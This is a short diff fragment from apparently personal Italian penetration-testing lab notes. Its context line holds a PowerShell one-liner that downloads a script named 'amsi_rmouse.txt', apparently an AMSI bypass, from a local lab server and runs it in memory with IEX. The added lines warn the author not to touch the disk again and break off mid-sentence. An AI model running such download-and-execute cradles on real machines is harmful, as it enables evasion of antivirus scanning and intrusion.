@@ -396,4 +396,5 @@ Apriamo un server http e lanciamolo sulla macchina windows
 (new-object system.net.webclient).downloadstring('http://192.168.56.6:8080/amsi_rmouse.txt')|IEX
 ```
 ![[Pasted image 20230906110016.png]]
-==ORA
+==ORA NON TOCCARE PIù IL DISCO ALTRIMENTI MANDI TUTTO A DONNINE==
+Per runnare gli script runn
